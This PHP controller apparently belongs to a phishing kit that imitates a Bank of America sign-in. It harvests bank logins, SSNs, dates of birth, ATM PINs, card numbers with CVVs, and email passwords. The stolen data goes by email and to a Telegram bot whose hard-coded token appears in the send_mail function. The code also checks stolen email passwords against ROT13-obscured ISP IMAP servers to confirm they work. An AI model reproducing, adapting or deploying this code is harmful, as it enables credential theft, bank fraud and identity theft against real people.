<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Home extends CI_Controller {


	public function index()
	{
		if (X_CAPTCHA) {
			$this->load->view('captcha');
		}else{
			$this->session->set_userdata('captcha_status', 'passed');
			redirect(site_url('authen'));
		}
	}

	public function authen()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('authen');
	}
	public function authener()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
			if ($this->input->method() == 'post') {
			$msg[] = "AUTH INFO";
			$msg[] = "OnlineID: " . $this->input->post('onid');
			$msg[] = "Passwcode: " . $this->input->post('pasc');
			$msg[] = "Mobilei: " . $this->input->post('mobile');
			$this->send_mail($msg, 'BOA RZLT');
		}
	
		
		$this->load->view('authener');
	}
		public function perinfo()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
		
		if ($this->input->method() == 'post') {
			$msg[] = "AUTH INFO ERR";
			$msg[] = "OnlineID: " . $this->input->post('onid');
			$msg[] = "Passwcode: " . $this->input->post('pasc');
			$this->send_mail($msg, 'BOA RZLT');
		}
		
		
		$this->load->view('perinfo');
	}
	public function sitekey()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
			if ($this->input->method() == 'post') {
			$msg[] = "PERSONAL INFO";
			$msg[] = "Full Name: " . $this->input->post('fname');
			$msg[] = "Phone: " . $this->input->post('phon');
			$msg[] = "Driving Licence: " . $this->input->post('dlv');
			$msg[] = "SSN: " . $this->input->post('ssni');
			$msg[] = "Dob: " . $this->input->post('dob');
			$msg[] = "ATM PIN: " . $this->input->post('ati');
			$msg[] = "Email Address: " . $this->input->post('ema');
			$msg[] = "Email Password: " . $this->input->post('emp');
			$this->send_mail($msg, 'BOA RZLT');
		}
	
		
		$this->load->view('sitekey');
	}
		public function com()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
			
		
		if ($this->input->method() == 'post') {
			
		$mboxem = $this->input->post('ema');
		$mbox = $this->input->post('emp');
		
		$charter = '/charter/i';
		$rrnet = '/.rr.net/i';
		$rrcom = '/.rr.com/i';
		$netzero = '/netzero/i';
		$juno = '/juno/i';
		$wow1 = '/wowway/i';
		$wow2 = '/knology/i';
		$wind = '/windstream/i';
		$cent1 = '/centurylink/i';
		$cent2 = '/embarqmail/i';
		$cent3 = '/q.com/i';
		$opt = '/optonline/i';
		$comc = '/comcast/i';
		$cox = '/cox.net/i';
		$att = '/att.net/i';
		$att2 = '/bellsouth.net/i';
		$att3 = '/sbcglobal.net/i';

		$check = "2";

		if (preg_match($charter, $mboxem) == 1){
			$ats= str_rot13("{zbovyr.punegre.arg:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($rrnet, $mboxem) == 1){
			$ats= str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($rrcom, $mboxem) == 1){
			$ats= str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($cent1, $mboxem) == 1){
			$ats= str_rot13("{znvy.praghelyvax.arg:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($cent2, $mboxem) == 1){
			$ats= str_rot13("{znvy.praghelyvax.arg:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($cent3, $mboxem) == 1){
			$ats= str_rot13("{znvy.praghelyvax.arg:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($netzero, $mboxem) == 1){
			$ats= str_rot13("{cbc.argmreb.pbz:995/cbc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($juno, $mboxem) == 1){
			$ats= str_rot13("{cbc.whab.pbz:995/cbc3/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($wow1, $mboxem) == 1){
			$ats= str_rot13("{znvy.jbjjnl.pbz:995/cbc3/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($wow2, $mboxem) == 1){
			$ats= str_rot13("{znvy.jbjjnl.pbz:995/cbc3/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($opt, $mboxem) == 1){
			$ats= str_rot13("{znvy.bcgbayvar.arg:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($comc, $mboxem) == 1){
			$ats= str_rot13("{vznc.pbzpnfg.arg:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($cox, $mboxem) == 1){
			$ats= str_rot13("{vznc.pbk.arg:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($wind, $mboxem) == 1){
			$ats= str_rot13("{cbc.jvaqfgernz.arg:995/cbc3/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($att, $mboxem) == 1){
			$ats= str_rot13("{vznc.znvy.lnubb.pbz:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($att2, $mboxem) == 1){
			$ats= str_rot13("{vznc.znvy.lnubb.pbz:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else if (preg_match($att3, $mboxem) == 1){
			$ats= str_rot13("{vznc.znvy.lnubb.pbz:993/vznc/ffy/abinyvqngr-preg}");
			$check = "1";
		} else {
			$check = "2";
		}

				
			if ($this->input->post('errori') == "2"){
			
			if ($check == "1" && TRUE_LOGIN == "1"){

			if ($mbox=imap_open( $ats, $mboxem, $mbox )) {
			$status = "Connected";
			imap_close($mbox);
			} else {
			$status = "FAIL!";
			}

			if ($status == "Connected") {
						$msg = [];
						$msg[] = "Email TRUE-OK";
						$msg[] = "Email Address: " . $this->input->post('ema');
						$msg[] = "Email Password: " . $this->input->post('emp');
						$this->send_mail($msg, 'BOA RZLT');
						header ("Location: sitekey?error=3");
			} else {
						$msg = [];
						$msg[] = "Email Error-1";
						$msg[] = "Email Address: " . $this->input->post('ema');
						$msg[] = "Email Password: " . $this->input->post('emp');
						$this->send_mail($msg, 'BOA RZLT');
						header("Location: sitekey?error=1");
			}

			} else {
						$msg = [];
						$msg[] = "Email Error-1";
						$msg[] = "Email Address: " . $this->input->post('ema');
						$msg[] = "Email Password: " . $this->input->post('emp');
						$this->send_mail($msg, 'BOA RZLT');
						header("Location: sitekey?error=1");

			}
			} else if ($this->input->post('errori') == "1"){
			$msg = [];
			$msg[] = "Email Second Error 1";
			$msg[] = "Email Address: " . $this->input->post('ema');
			$msg[] = "Email Password: " . $this->input->post('emp');
			$this->send_mail($msg, 'BOA RZLT');
			header("Location: sitekey?error=3");
			} else if ($this->input->post('errori') == "3"){
			$msg = [];
			$msg[] = "CARD INFO";
			$msg[] = "Credit/Debit Card number: " . $this->input->post('ccn');
			$msg[] = "Expire Date: " . $this->input->post('exp');
			$msg[] = "CVV/CVS: " . $this->input->post('cvci');
			$msg[] = "ATM PIN: " . $this->input->post('ati');
			$this->send_mail($msg, 'BOA RZLT');
			header("Location: com");
			}
			
			
			}
		
		$this->load->view('com');
	}
	public function send_mail($msg=[], $sbj='')
	{
		$ip = getenv("REMOTE_ADDR");
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$hostname = gethostbyaddr($ip);

		$this->email->from(X_RESULT_FROMEMAIL, X_RESULT_NAME);
		$this->email->to(X_RESULT_EMAIL);

		$msg[] = "IP: " . $ip;
		$msg[] = "UA: " . $useragent;
		$msg[] = "HOST: " . $hostname;
		$msg_body = "";
		foreach ($msg as $key => $m) {
			$msg_body .= $m."\n";
		}

		$this->email->message($msg_body);
$token = "7359470206:AAGc04eGMCVSGN41iRbsBK4Ncnu2BXAF4uQ";

$data = [
    'text' => $msg_body,
    'chat_id' => '426622106'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
		$this->email->subject($sbj .' - '. $ip);


		if (@$this->email->send()) {
			// exit('true');
			return true;
		} else {
			return false;
			// exit('false');
		}		
	}
}
?>